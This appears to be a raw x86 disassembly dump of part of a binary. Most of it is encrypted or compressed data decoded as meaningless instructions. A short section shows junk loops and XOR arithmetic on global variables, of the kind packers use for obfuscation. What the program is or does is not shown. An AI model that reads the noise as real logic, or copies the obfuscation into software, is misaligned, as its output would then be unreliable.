  413782:	xor    eax,0xb970706b
  413787:	jle    0x4137f9
  413789:	jo     0x413786
  41378b:	loope  0x413807
  41378d:	retf   0x12ac
  413790:	repnz and al,0x3e
  413793:	adc    esp,DWORD PTR [esi]
  413795:	push   eax
  413796:	imul   ecx,DWORD PTR [esi],0x5b9e545c
  41379c:	out    0x87,eax
  41379e:	aad    0xd0
  4137a0:	cld    
  4137a1:	pop    eax
  4137a2:	jno    0x41374c
  4137a4:	dec    ebx
  4137a5:	adc    eax,0xb05e8d1d
  4137aa:	adc    al,0x66
  4137ac:	dec    edx
  4137ad:	(bad)  
  4137ae:	xchg   esi,eax
  4137af:	mov    WORD PTR [eax-0x31],cs
  4137b2:	pop    ds
  4137b3:	push   ds
  4137b4:	jmp    0x1cc21735
  4137b9:	jmp    0x5ea63828
  4137be:	scas   al,BYTE PTR es:[edi]
  4137bf:	(bad)  
  4137c1:	(bad)  
  4137c2:	fdivp  st(3),st
  4137c4:	dec    ebx
  4137c5:	push   es
  4137c6:	adc    DWORD PTR [edx-0x7045161f],edi
  4137cc:	and    eax,0xc245ec49
  4137d1:	arpl   WORD PTR [edx-0x7b],ax
  4137d4:	sbb    edi,DWORD PTR [eax-0x4b]
  4137d7:	lock ins BYTE PTR es:[edi],dx
  4137d9:	(bad)  
  4137db:	mov    esp,DWORD PTR [ebx+0x6538346f]
  4137e1:	xlat   BYTE PTR ds:[ebx]
  4137e2:	popf   
  4137e3:	inc    edx
  4137e4:	sbb    ah,cl
  4137e6:	xchg   edi,eax
  4137e7:	add    al,0xf2
  4137e9:	cdq    
  4137ea:	test   eax,edx
  4137ec:	mov    ah,0x3
  4137ee:	jle    0x413828
  4137f0:	imul   ecx,DWORD PTR [edi-0x38],0xffffff82
  4137f4:	aad    0x6c
  4137f6:	mov    esp,0xb93ca1eb
  4137fb:	fiadd  WORD PTR [esi+esi*4-0x8]
  4137ff:	mov    ah,0xa4
  413801:	cmp    al,0x47
  413803:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413804:	sub    ebx,eax
  413806:	in     al,0x76
  413808:	xchg   ebp,eax
  413809:	xor    DWORD PTR ds:0x4486f9b5,eax
  41380f:	push   esi
  413810:	pushf  
  413811:	and    edx,ecx
  413813:	inc    ebp
  413814:	ret    
  413815:	and    BYTE PTR [edi-0x42e634a1],0x3
  41381c:	outs   dx,DWORD PTR ds:[esi]
  41381d:	xchg   edx,eax
  41381e:	sahf   
  41381f:	or     eax,0x98145017
  413824:	mov    ebx,0x2b724295
  413829:	shl    BYTE PTR [esi-0x3f],0x20
  41382d:	gs leave 
  41382f:	jmp    0x413804
  413831:	jle    0x4138af
  413833:	rcr    DWORD PTR ds:0x432571c2,cl
  413839:	in     eax,dx
  41383a:	jbe    0x413807
  41383c:	sub    eax,0xa0dca3f4
  413841:	data16 test al,0x78
  413844:	adc    al,0xfd
  413846:	mov    ebx,0x6a15fdf9
  41384b:	xchg   DWORD PTR [esi-0x7a667133],ebp
  413851:	stos   BYTE PTR es:[edi],al
  413852:	sbb    eax,0x6eb0107d
  413857:	sbb    eax,0xb212676f
  41385c:	fdiv   DWORD PTR [ebx]
  41385e:	mov    ds:0x2ed1f172,eax
  413863:	xchg   esp,eax
  413864:	cmc    
  413865:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413866:	cld    
  413867:	retf   0x2de4
  41386a:	mov    ds:0xfd500774,eax
  41386f:	repnz fs stos BYTE PTR es:[edi],al
  413872:	(bad)  
  413873:	push   edi
  413874:	push   esp
  413875:	xchg   ecx,eax
  413876:	xbegin 0xfd7eaf95
  41387c:	lea    ebp,[ebx+edx*1-0xece2a50]
  413883:	jmp    0x374a:0xa4b2a014
  41388a:	xor    al,0xd5
  41388c:	sti    
  41388d:	out    0x7b,eax
  41388f:	pop    edi
  413890:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  413892:	fisub  DWORD PTR [eax+0x2c0a488]
  413898:	test   eax,0x8f054d5e
  41389d:	les    edx,FWORD PTR [ebx+0x3f3114d9]
  4138a3:	jp     0x4138be
  4138a5:	mov    ch,0x9e
  4138a7:	inc    ecx
  4138a8:	shl    BYTE PTR [esi],cl
  4138aa:	sbb    eax,0xa533bb31
  4138af:	cmp    eax,DWORD PTR [eax+0x4cb40d64]
  4138b5:	jge    0x4138b0
  4138b7:	mov    bh,0xb8
  4138b9:	cs push ss
  4138bb:	ja     0x41387f
  4138bd:	inc    edi
  4138be:	stos   DWORD PTR es:[edi],eax
  4138bf:	sub    al,0x72
  4138c1:	and    bl,bl
  4138c3:	mov    DWORD PTR [edi-0x15],esp
  4138c6:	outs   dx,DWORD PTR ds:[esi]
  4138c7:	dec    esp
  4138c8:	cld    
  4138c9:	jno    0x4138f1
  4138cb:	dec    eax
  4138cc:	clc    
  4138cd:	retf   
  4138ce:	sbb    edi,edi
  4138d0:	retf   
  4138d1:	test   eax,0x2169256c
  4138d6:	js     0x4138ae
  4138d8:	mov    ebp,0x5a26c539
  4138dd:	ret    0x3da
  4138e0:	mov    esi,0x85dbe2d5
  4138e5:	cmp    dl,BYTE PTR [ebp-0x1e9dbb78]
  4138eb:	jns    0x413941
  4138ed:	xor    DWORD PTR [edi],eax
  4138ef:	cmp    bl,BYTE PTR [ecx-0x52]
  4138f2:	xlat   BYTE PTR ds:[ebx]
  4138f3:	cmp    BYTE PTR [ebx+eiz*8-0x2fa45ef0],al
  4138fa:	sbb    bh,ah
  4138fc:	adc    BYTE PTR [edx+0x266dea11],ah
  413902:	repnz pop edi
  413904:	ds nop
  413906:	cdq    
  413907:	mov    dh,0xe5
  413909:	or     al,0x29
  41390b:	xchg   DWORD PTR [esi+0x25],edi
  41390e:	fwait
  41390f:	aad    0xc9
  413911:	iret   
  413912:	sbb    al,cl
  413914:	jb     0x413938
  413916:	xor    esi,edi
  413918:	js     0x4138c0
  41391a:	(bad)  
  41391b:	(bad)  [edi-0x36]
  41391e:	mov    esp,0x512c8d2c
  413923:	mov    dh,0xb7
  413925:	cdq    
  413926:	jp     0x4138f5
  413928:	stos   DWORD PTR es:[edi],eax
  413929:	lahf   
  41392a:	xor    bh,BYTE PTR [eax+0x3289e2ee]
  413930:	ds in  al,dx
  413932:	or     eax,0x3c0cc4df
  413937:	mov    edi,0x809430df
  41393c:	cmp    bl,BYTE PTR [ecx+0x22d717b1]
  413942:	xor    BYTE PTR [edi+0x45abdaf4],bh
  413948:	pusha  
  413949:	jns    0x413940
  41394b:	dec    edx
  41394c:	jp     0x413935
  41394e:	cmp    BYTE PTR [edi-0x8],0x0
  413952:	mov    ch,0xa
  413954:	stc    
  413955:	inc    esp
  413956:	jle    0x4138f5
  413958:	data16 mov ss,WORD PTR es:[ebx+0x2f518626]
  413960:	xlat   BYTE PTR ds:[ebx]
  413961:	push   eax
  413962:	adc    DWORD PTR [esi-0x71],edx
  413965:	out    dx,eax
  413966:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413968:	mov    esi,0x3f7e207c
  41396d:	xor    eax,0x6fd4a468
  413972:	cmp    eax,0x1dea2c66
  413977:	and    al,0x29
  413979:	mov    ?,WORD PTR [esi+0x1]
  41397c:	add    eax,0x1fbcd8c
  413981:	mov    esp,eax
  413983:	sub    eax,0xc7efe09b
  413988:	mov    ah,0xc5
  41398a:	xchg   ebx,eax
  41398b:	je     0x4139cf
  41398d:	or     eax,0x416b2067
  413992:	dec    ebx
  413993:	hlt    
  413994:	and    eax,0xaebbd948
  413999:	pop    es
  41399a:	mov    fs,WORD PTR [edx+0x878664b]
  4139a0:	cmovne esi,DWORD PTR [ecx]
  4139a3:	and    dl,BYTE PTR [edi+0x6d]
  4139a6:	(bad)  
  4139a7:	call   0x144c:0x88c74024
  4139ae:	cld    
  4139af:	and    al,BYTE PTR [eax+0x40]
  4139b2:	mov    al,0x4a
  4139b4:	mov    cl,0xbf
  4139b6:	ds js  0x4139b0
  4139b9:	stos   DWORD PTR es:[edi],eax
  4139ba:	cld    
  4139bb:	jo     0x413a2c
  4139bd:	nop
  4139be:	sbb    al,0xfd
  4139c0:	lea    eax,[ebx-0x78]
  4139c3:	fnstsw WORD PTR [ecx+0x3dc2c8c8]
  4139c9:	lods   al,BYTE PTR ds:[esi]
  4139ca:	shl    DWORD PTR [ebx+0x7e9855f0],0x2f
  4139d1:	(bad)  
  4139d2:	and    al,0xfc
  4139d4:	xchg   esp,eax
  4139d5:	sbb    DWORD PTR [edi],esp
  4139d7:	jmp    0xa160:0x5b981493
  4139de:	xchg   ebp,eax
  4139df:	fbld   TBYTE PTR [edi-0x6c]
  4139e2:	loopne 0x413a0c
  4139e4:	sbb    edx,edi
  4139e6:	push   esi
  4139e7:	jnp    0x4139ad
  4139e9:	sar    BYTE PTR [esi+0x76e5e076],1
  4139ef:	in     al,0x76
  4139f1:	retf   0x108a
  4139f4:	fsubr  st(7),st
  4139f6:	pop    esi
  4139f7:	enter  0x6caf,0x81
  4139fb:	sbb    bh,ch
  4139fd:	push   ebx
  4139fe:	dec    ecx
  4139ff:	push   ds
  413a00:	inc    esi
  413a01:	xor    cl,BYTE PTR [esi-0x1f]
  413a04:	arpl   WORD PTR [edi+0x36],dx
  413a07:	add    al,0x81
  413a09:	pop    ebp
  413a0a:	stc    
  413a0b:	mov    edi,DWORD PTR [ecx-0x7b019119]
  413a11:	xor    DWORD PTR [edi+0x5f3af83d],edi
  413a17:	(bad)  
  413a18:	cmc    
  413a19:	cmp    edi,DWORD PTR [ecx-0x4fca523f]
  413a1f:	pop    DWORD PTR [ebx]
  413a21:	jg     0x413a11
  413a23:	and    ah,bh
  413a25:	jns    0x413a95
  413a27:	ret    0xb549
  413a2a:	mov    esp,0x70a227e7
  413a2f:	out    0xb1,eax
  413a31:	push   edx
  413a32:	popf   
  413a33:	and    ah,BYTE PTR [ebp+eiz*1-0x4b]
  413a37:	aaa    
  413a38:	cmp    DWORD PTR [edi],ebp
  413a3a:	or     eax,0x3e6adb4e
  413a3f:	sbb    al,0x38
  413a41:	jmp    0xfecddbc
  413a46:	cli    
  413a47:	(bad)  
  413a49:	mov    cl,BYTE PTR [ebx-0x48]
  413a4c:	and    DWORD PTR ds:0xe8d06557,edx
  413a52:	ja     0x413a11
  413a54:	(bad)  
  413a55:	(bad)  
  413a56:	jmp    0x413d3a
  413a5b:	pop    ebx
  413a5c:	ins    DWORD PTR es:[edi],dx
  413a5d:	and    al,0xa9
  413a5f:	xor    dh,BYTE PTR [ecx+0x71]
  413a62:	ins    DWORD PTR es:[edi],dx
  413a63:	jp     0x413a20
  413a65:	or     esi,ecx
  413a67:	jne    0x413a8c
  413a69:	xor    eax,0x7070687e
  413a6f:	mov    ecx,0xc070707e
  413a74:	mov    eax,ds:0xbfef9b
  413a79:	in     eax,dx
  413a7a:	test   BYTE PTR [ebp+0xb588fa5],dh
  413a80:	cmp    ch,BYTE PTR [esi-0x18]
  413a83:	sbb    esi,DWORD PTR [edi]
  413a85:	pop    ss
  413a86:	shr    DWORD PTR [ebx+0x7e],cl
  413a89:	dec    ecx
  413a8a:	xor    BYTE PTR [edx],ch
  413a8c:	mov    eax,ds:0x67e97047
  413a91:	or     al,0x8e
  413a93:	(bad)  
  413a94:	(bad)  [edi-0x5a00a6dd]
  413a9a:	adc    eax,0x7b3a8320
  413a9f:	mov    ebp,0x749581c0
  413aa4:	push   0x181f4aa1
  413aa9:	or     DWORD PTR [esi*4+0x5a674a7],eax
  413ab0:	mov    BYTE PTR [edi+0x79],0xe0
  413ab4:	mov    ds:0xe215ff69,eax
  413ab9:	jmp    FWORD PTR [edi-0x16b40e44]
  413abf:	xor    cl,dl
  413ac1:	xor    DWORD PTR [ebx-0x4043451b],esi
  413ac7:	adc    DWORD PTR [edx-0x45],0xffffffba
  413acb:	mov    DWORD PTR ds:0x3502368,ebx
  413ad1:	push   0xffffffa1
  413ad3:	adc    ch,BYTE PTR [eax+0x25]
  413ad6:	push   ecx
  413ad7:	xchg   ebp,eax
  413ad8:	popa   
  413ad9:	and    eax,0x2c953b74
  413ade:	xchg   edi,eax
  413adf:	dec    ebp
  413ae0:	dec    eax
  413ae1:	iret   
  413ae2:	inc    ecx
  413ae3:	ds add esi,0x56
  413ae7:	adc    al,0xfb
  413ae9:	aad    0xab
  413aeb:	add    al,0x8f
  413aed:	adc    ebx,DWORD PTR [edx-0x2eb16050]
  413af3:	xor    eax,0xacffedf6
  413af8:	and    ebx,DWORD PTR [edx+0x141e18b7]
  413afe:	std    
  413aff:	iret   
  413b00:	fidiv  DWORD PTR [ecx]
  413b02:	stc    
  413b03:	jno    0x413a8c
  413b05:	and    ebx,esi
  413b07:	push   eax
  413b08:	outs   dx,DWORD PTR ds:[esi]
  413b09:	into   
  413b0a:	xor    BYTE PTR [edx+eax*4+0x68],cl
  413b0e:	aad    0x4e
  413b10:	(bad)  
  413b11:	xor    eax,0xa507ac4
  413b16:	push   ss
  413b17:	add    dx,WORD PTR gs:[edi+0x23]
  413b1c:	add    eax,0xaac81cbb
  413b21:	jmp    0xf44ff11d
  413b26:	and    eax,0xf3f17a8b
  413b2b:	adc    BYTE PTR [eax+eiz*8+0x61],cl
  413b2f:	stc    
  413b30:	call   0x4fe5cf36
  413b35:	push   esp
  413b36:	jle    0x413b41
  413b38:	mov    dh,0x5a
  413b3a:	fwait
  413b3b:	push   es
  413b3c:	jne    0x413adf
  413b3e:	outs   dx,BYTE PTR ds:[esi]
  413b3f:	jg     0x413b8a
  413b41:	xchg   edi,eax
  413b42:	push   esp
  413b43:	inc    esp
  413b44:	sub    ebp,DWORD PTR [ecx+0x99e5dc6]
  413b4a:	mov    ebp,0xd9ad98ee
  413b4f:	ret    0xfcf4
  413b52:	(bad)  
  413b53:	retf   
  413b54:	xor    BYTE PTR [eax+0x5c],cl
  413b57:	and    DWORD PTR [edi],0xffffffc8
  413b5a:	jl     0x413b29
  413b5c:	ror    bh,1
  413b5e:	xchg   edi,eax
  413b5f:	xchg   edx,eax
  413b60:	fbstp  TBYTE PTR [eax-0x20]
  413b63:	adc    ebp,0x2ca55cbd
  413b69:	test   esp,ebp
  413b6b:	or     ebp,DWORD PTR [ebx]
  413b6d:	and    ecx,ecx
  413b6f:	rcl    BYTE PTR [ebx-0x5b480119],0x17
  413b76:	out    0xdd,al
  413b78:	add    edx,ebp
  413b7a:	hlt    
  413b7b:	scas   eax,DWORD PTR es:[edi]
  413b7c:	js     0x413b2a
  413b7e:	(bad)  
  413b7f:	cwde   
  413b80:	xor    ch,BYTE PTR [edx-0x3cff454b]
  413b86:	jns    0x413bee
  413b88:	jle    0x413bf7
  413b8a:	jnp    0x413b21
  413b8c:	add    cl,BYTE PTR [ecx-0x1390200]
  413b92:	xor    ah,BYTE PTR [ebx-0x73]
  413b95:	(bad)  
  413b96:	out    dx,eax
  413b97:	leave  
  413b98:	inc    ebp
  413b99:	pop    ecx
  413b9a:	cli    
  413b9b:	sti    
  413b9c:	jmp    0x413ba6
  413b9e:	lods   eax,DWORD PTR ds:[esi]
  413b9f:	xchg   edi,eax
  413ba0:	sar    ebx,1
  413ba2:	rol    BYTE PTR [eax+0x7ba2bfef],1
  413ba8:	adc    eax,0x666ba782
  413bad:	xor    dh,BYTE PTR [eax]
  413baf:	(bad)  
  413bb0:	test   al,0x29
  413bb2:	xor    eax,0x6eab3acd
  413bb7:	add    dl,al
  413bb9:	test   edx,esi
  413bbb:	cmp    BYTE PTR [ebx+edi*2-0x22],0x2e
  413bc0:	xor    ecx,DWORD PTR [edx+eiz*4+0xb0a0d57]
  413bc7:	add    ah,BYTE PTR [eax]
  413bc9:	pop    edx
  413bca:	cmc    
  413bcb:	xchg   ebp,eax
  413bcc:	out    0x16,al
  413bce:	loop   0x413bf5
  413bd0:	mov    al,0xd
  413bd2:	push   eax
  413bd3:	bnd jb 0x413be9
  413bd6:	test   eax,0xc39e87
  413bdb:	loop   0x413c1c
  413bdd:	bound  ecx,QWORD PTR [ecx]
  413bdf:	sbb    esp,ebp
  413be1:	cmp    DWORD PTR [edi+eax*1],0xf
  413be5:	test   ch,bl
  413be7:	mov    ch,0x90
  413be9:	outs   dx,DWORD PTR ds:[esi]
  413bea:	dec    edx
  413beb:	inc    esi
  413bec:	pop    ebp
  413bed:	jecxz  0x413c1f
  413bef:	ret    
  413bf0:	aas    
  413bf1:	fisub  DWORD PTR [ebx-0x7cb268bb]
  413bf7:	dec    edi
  413bf8:	lods   eax,DWORD PTR ds:[esi]
  413bf9:	and    al,0x3c
  413bfb:	outs   dx,DWORD PTR ds:[esi]
  413bfc:	add    eax,0xf33b6a1f
  413c01:	stos   DWORD PTR es:[edi],eax
  413c02:	pushf  
  413c03:	lock gs xor esi,edi
  413c07:	sub    BYTE PTR [edi],al
  413c09:	enter  0x6c2e,0xa7
  413c0d:	xor    al,0xa7
  413c0f:	jle    0x413c0f
  413c11:	js     0x413c54
  413c13:	add    BYTE PTR [esi-0x434744c4],cl
  413c19:	pop    ebx
  413c1a:	int3   
  413c1b:	mov    bh,0x50
  413c1d:	lods   al,BYTE PTR ds:[esi]
  413c1e:	mov    WORD PTR ds:0x6fd659f1,?
  413c24:	mov    ecx,0xa412e720
  413c29:	(bad)  [esi+ecx*8]
  413c2c:	shr    BYTE PTR [ebx],0xfc
  413c2f:	xchg   eax,esp
  413c31:	lock adc DWORD PTR [ecx-0x766a6e88],edx
  413c38:	lods   al,BYTE PTR ds:[esi]
  413c39:	pop    esi
  413c3a:	cmp    ecx,DWORD PTR [esi+0x11]
  413c3d:	or     ebp,DWORD PTR [esi+0x51d7105e]
  413c43:	ins    BYTE PTR es:[edi],dx
  413c44:	sbb    al,0x88
  413c46:	push   0x1bff8d91
  413c4b:	in     eax,dx
  413c4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c4d:	gs clc 
  413c4f:	xlat   BYTE PTR ds:[ebx]
  413c50:	mov    eax,ds:0xf06f5343
  413c55:	sub    esp,DWORD PTR [esp+eax*8-0x2]
  413c59:	(bad)  
  413c5a:	call   0xe4fe32a
  413c5f:	sbb    cl,BYTE PTR ds:0x2ad73386
  413c65:	push   0x18bb9664
  413c6a:	out    0x98,eax
  413c6c:	sub    bh,cl
  413c6e:	adc    eax,DWORD PTR [eax]
  413c70:	jge    0x413cb2
  413c72:	es je  0x413cae
  413c75:	call   0x1d5d:0xb6f61c35
  413c7c:	mov    ecx,0xdac2e47f
  413c81:	mul    BYTE PTR [edi]
  413c83:	sub    BYTE PTR [ebx-0x6fff47ba],ch
  413c89:	test   eax,0xfc8cefc4
  413c8e:	out    dx,eax
  413c8f:	dec    di
  413c91:	stc    
  413c92:	ret    0x9a8c
  413c95:	push   DWORD PTR [edi+0x27]
  413c98:	stos   DWORD PTR es:[edi],eax
  413c99:	sbb    cl,BYTE PTR [ebp-0x33]
  413c9c:	pop    ebx
  413c9d:	jne    0x413c74
  413c9f:	or     al,0xd5
  413ca1:	xchg   edi,eax
  413ca2:	jnp    0x413c79
  413ca4:	cmp    DWORD PTR [ebx],ebp
  413ca6:	jnp    0x413c47
  413ca8:	mov    eax,ds:0x8058945a
  413cad:	push   ebx
  413cae:	loopne 0x413c33
  413cb0:	test   al,0xa1
  413cb2:	scas   eax,DWORD PTR es:[edi]
  413cb3:	mov    eax,0x4f6a1b05
  413cb8:	or     al,0x98
  413cba:	lahf   
  413cbb:	or     eax,0x9ac9ff9d
  413cc0:	sti    
  413cc1:	push   ebx
  413cc2:	sub    BYTE PTR [ebx-0x64923611],ah
  413cc8:	(bad)  
  413cc9:	mov    cl,0xe0
  413ccb:	cld    
  413ccc:	mov    es,WORD PTR [ecx+0x23]
  413ccf:	loopne 0x413c55
  413cd1:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  413cd3:	xchg   ebx,eax
  413cd4:	cs (bad) 
  413cd6:	mov    dh,0x7
  413cd8:	enter  0x913c,0x8b
  413cdc:	jle    0x413c82
  413cde:	xor    eax,0xad577057
  413ce3:	sti    
  413ce4:	xor    BYTE PTR [edx+0x22],cl
  413ce7:	jo     0x413c88
  413ce9:	and    al,0x3d
  413ceb:	xchg   edx,eax
  413cec:	out    0xf,al
  413cee:	push   es
  413cef:	pop    edi
  413cf0:	psllq  mm0,mm4
  413cf3:	mov    ds:0xc5bb1da3,al
  413cf8:	nop
  413cf9:	sbb    BYTE PTR ds:0x2f9439ab,ah
  413cff:	mov    al,0xf
  413d01:	hlt    
  413d02:	inc    bp
  413d04:	inc    ecx
  413d05:	mov    eax,0xdf24864c
  413d0a:	es ret 
  413d0c:	in     al,0x62
  413d0e:	push   ss
  413d0f:	js     0x413cde
  413d11:	ret    0x627c
  413d14:	sahf   
  413d15:	mov    ch,0x38
  413d17:	fistp  DWORD PTR [eax+0x7b5d1ffa]
  413d1d:	div    BYTE PTR ds:0x2a5965aa
  413d23:	mov    dl,0x51
  413d25:	jb     0x413d10
  413d27:	jne    0x413d93
  413d29:	or     BYTE PTR [esi],ch
  413d2b:	adc    eax,0x7e6ee09a
  413d30:	aas    
  413d31:	repz xchg ebp,eax
  413d33:	jns    0x413d75
  413d35:	data16 sahf 
  413d37:	nop
  413d38:	pop    edx
  413d39:	xor    BYTE PTR [ecx+0x458be045],cl
  413d3f:	cld    
  413d40:	sub    ecx,ecx
  413d42:	mov    ecx,DWORD PTR [ebp-0x20]
  413d45:	mov    DWORD PTR ds:0x42e6ff,0x1b
  413d4f:	cmp    DWORD PTR ds:0x42e6ff,0x0
  413d56:	je     0x413dab
  413d5c:	cmp    DWORD PTR ds:0x42e6ff,0x2
  413d63:	jne    0x413d7f
  413d69:	push   DWORD PTR [ebp-0xc]
  413d6c:	push   0x52a1
  413d71:	push   0x824e
  413d76:	push   DWORD PTR [ebp-0x18]
  413d79:	call   DWORD PTR ds:0x42e56b
  413d7f:	cmp    DWORD PTR ds:0x42e6ff,0x3
  413d86:	jne    0x413d99
  413d8c:	mov    esi,DWORD PTR ds:0x42e6ff
  413d92:	dec    esi
  413d93:	mov    DWORD PTR ds:0x42e6ff,esi
  413d99:	mov    esi,DWORD PTR ds:0x42e6ff
  413d9f:	dec    esi
  413da0:	mov    DWORD PTR ds:0x42e6ff,esi
  413da6:	jmp    0x413d4f
  413dab:	mov    esi,0x7510855
  413db0:	or     DWORD PTR ds:0x42e70f,0x42fd86
  413dba:	xor    eax,esi
  413dbc:	add    eax,ebx
  413dbe:	cmp    ecx,eax
  413dc0:	mov    DWORD PTR ds:0x42e12c,0x588b
  413dca:	je     0x414b4e
  413dd0:	push   DWORD PTR [ebp-0x20]
  413dd3:	dec    DWORD PTR ds:0x42e6f7
  413dd9:	push   DWORD PTR [ebp+0x8]
  413ddc:	xor    DWORD PTR ds:0x42fcd9,0x42e120
  413de6:	call   0x405485
  413deb:	mov    DWORD PTR [ebp-0x14],eax
  413dee:	and    DWORD PTR ds:0x42e6fb,0x0
  413df8:	jmp    0x413e08
  413dfd:	mov    eax,ds:0x42e6fb
  413e02:	inc    eax
  413e03:	mov    ds:0x42e6fb,eax
  413e08:	cmp    DWORD PTR ds:0x42e6fb,0x10
  413e0f:	jae    0x413e33
  413e15:	cmp    DWORD PTR ds:0x42e6fb,0x16
  413e1c:	jne    0x413e28
  413e22:	call   DWORD PTR ds:0x42e48b
  413e28:	jmp    0x413dfd
  413e2d:	sub    DWORD PTR ds:0x42fd01,ecx
  413e33:	mov    eax,DWORD PTR [ebp-0x4]
  413e36:	or     DWORD PTR ds:0x42e6f7,edx
  413e3c:	mov    ecx,DWORD PTR [ebp-0x14]
  413e3f:	adc    DWORD PTR ds:0x42fd8a,0x2715
  413e49:	xor    eax,esi
  413e4b:	dec    DWORD PTR ds:0x42e703
  413e51:	add    eax,ebx
  413e53:	mov    DWORD PTR ds:0x42e11c,0x499a
  413e5d:	cmp    ecx,eax
  413e5f:	je     0x414b4e
  413e65:	not    eax
  413e67:	mov    eax,DWORD PTR [ebp-0x14]
  413e6a:	mov    eax,DWORD PTR [eax+0x18]
  413e6d:	mov    DWORD PTR [ebp-0x20],eax
  413e70:	xor    DWORD PTR ds:0x42e6fb,0x4f5
  413e7a:	jmp    0x41415e
  413e7f:	lods   al,BYTE PTR ds:[esi]
  413e80:	mov    WORD PTR [edx],gs
  413e82:	loopne 0x413eae
  413e84:	outs   dx,BYTE PTR ds:[esi]
  413e85:	push   0x4c
  413e87:	repz push edi
  413e89:	scas   eax,DWORD PTR es:[edi]
  413e8a:	(bad)  
  413e8b:	pop    ss
  413e8c:	and    bl,BYTE PTR [ecx+0x70764719]
  413e92:	jo     0x413e4d
  413e94:	jle    0x413f06
  413e96:	jo     0x413f0e
  413e98:	or     DWORD PTR [edx],0xffffff9f
  413e9b:	ss aad 0x89
  413e9e:	jb     0x413e86
  413ea0:	or     bl,BYTE PTR ds:0x9b522aec
  413ea6:	out    0xfd,al
  413ea8:	sbb    DWORD PTR [esp+ecx*2+0x15],esp
  413eac:	xchg   ecx,eax
  413ead:	inc    ecx
  413eae:	sub    ecx,eax
  413eb0:	daa    
  413eb1:	dec    edx
  413eb2:	mov    edi,ecx
  413eb4:	adc    ecx,eax
  413eb6:	inc    BYTE PTR ds:0x9925cd00
  413ebc:	ret    0xd69d
  413ebf:	push   ds
  413ec0:	int    0xa7
  413ec2:	jae    0x413ebb
  413ec4:	jae    0x413ecf
  413ec6:	pop    esp
  413ec7:	fild   WORD PTR ds:0x242eae85
  413ecd:	or     ch,BYTE PTR [eax-0x22370410]
  413ed3:	out    dx,al
  413ed4:	add    eax,DWORD PTR [ebp+0x3c4fce57]
  413eda:	mov    dl,0xc5
  413edc:	xchg   edx,eax
  413edd:	sub    BYTE PTR [ebx+edx*4+0x68],ch
  413ee1:	ret    0x779b
  413ee4:	cmp    BYTE PTR [esi-0x235671fd],dh
  413eea:	xchg   edx,eax
  413eeb:	cwde   
  413eec:	push   esi
  413eed:	push   0xfffffff0
  413eef:	adc    BYTE PTR [esi+0x41],bh
  413ef2:	fist   DWORD PTR [ecx-0x18]
  413ef5:	aaa    
  413ef6:	scas   al,BYTE PTR es:[edi]
  413ef7:	ret    
  413ef8:	fs out 0x57,al
  413efb:	popf   
  413efc:	loope  0x413f06
  413efe:	mov    bl,0x14
  413f00:	mov    edx,0x63c84858
  413f05:	aad    0x20
  413f07:	fist   DWORD PTR [ecx+0x69]
  413f0a:	xchg   ecx,eax
  413f0b:	popw   ss
  413f0d:	aas    
  413f0e:	add    al,0x2f
  413f10:	pop    ecx
  413f11:	iret   
  413f12:	fld    TBYTE PTR [esi]
  413f14:	loop   0x413f86
  413f16:	sar    BYTE PTR [ecx+0x67],0xe6
  413f1a:	fdivr  QWORD PTR [edi+eax*8]
  413f1d:	sbb    al,0x72
  413f1f:	inc    ecx
  413f20:	dec    esi
  413f21:	test   eax,0xfec5fa40
  413f26:	iret   
  413f27:	std    
  413f28:	ret    
  413f29:	add    BYTE PTR [eax+0x2f],dh
  413f2c:	ficom  DWORD PTR ds:0x3c67ea3e
  413f32:	pop    ebx
  413f33:	(bad)  
  413f34:	leave  
  413f35:	(bad)  
  413f36:	adc    dh,BYTE PTR [ebx+0x5d]
  413f39:	cmp    ecx,DWORD PTR [ecx+0x52fd73da]
  413f3f:	bound  esi,QWORD PTR [ebp+0x549645bb]
  413f45:	jp     0x413fa4
  413f47:	hlt    
  413f48:	xor    edx,DWORD PTR [edx-0x59]
  413f4b:	add    ch,BYTE PTR [eax]
  413f4d:	ss jge 0x413f5f
  413f50:	adc    al,0x54
  413f52:	ins    DWORD PTR es:[edi],dx
  413f53:	xchg   BYTE PTR [edx],ah
  413f55:	aad    0x2a
  413f57:	push   cs
  413f58:	lods   al,BYTE PTR ds:[esi]
  413f59:	add    BYTE PTR [ecx],al
  413f5b:	shl    BYTE PTR [ebx-0x6d],cl
  413f5e:	cli    
  413f5f:	lahf   
  413f60:	mov    ds:0x15ef96b4,al
  413f65:	mov    DWORD PTR [ebx+0x2b6c1161],esp
  413f6b:	jbe    0x413fe7
  413f6d:	rcr    BYTE PTR [edi+0x12b56c09],cl
  413f73:	push   ebx
  413f74:	inc    ebx
  413f75:	and    ecx,DWORD PTR [ebp-0x71203246]
  413f7b:	mov    dl,0xdc
  413f7d:	jp     0x413fbc
  413f7f:	and    eax,0x2b57bc79
  413f84:	jb     0x413ff9
  413f86:	or     esp,ecx
  413f88:	shr    DWORD PTR [edi],cl
  413f8a:	fnstenv [esi-0x15]
  413f8d:	addr16 jnp 0x413fe2
  413f90:	dec    eax
  413f91:	js     0x413f50
  413f93:	pop    ecx
  413f94:	dec    ecx
  413f95:	leave  
  413f96:	and    DWORD PTR [ebx],edx
  413f98:	scas   eax,DWORD PTR es:[edi]
  413f99:	sti    
  413f9a:	in     al,0xa2
  413f9c:	repnz sub edi,DWORD PTR ds:0x20c3e572
  413fa3:	mov    esi,0x4905e587
  413fa8:	and    al,0xdd
  413faa:	and    cl,BYTE PTR [ecx]
  413fac:	add    dl,BYTE PTR [edx-0x3bad1f5f]
  413fb2:	or     bh,al
  413fb4:	rcr    DWORD PTR [eax-0x1adbce4],cl
  413fba:	iret   
  413fbb:	mov    esp,0xe172881e
  413fc0:	jnp    0x413fb5
  413fc2:	or     eax,0xcf8f836
  413fc7:	sub    BYTE PTR ds:0x8f07cf61,cl
  413fcd:	les    esi,FWORD PTR [ecx+ebp*2+0x37c5f355]
  413fd4:	dec    ecx
  413fd5:	cmc    
  413fd6:	mov    dl,0x7d
  413fd8:	jl     0x413fa5
  413fda:	cmp    eax,0x3fb17168
  413fdf:	cmp    eax,0xb7219518
  413fe4:	pop    ebx
  413fe5:	leave  
  413fe6:	sbb    al,0x93
  413fe8:	and    BYTE PTR [ebp-0x1f],cl
  413feb:	popf   
  413fec:	out    0x23,al
  413fee:	mul    DWORD PTR [ecx+0x45]
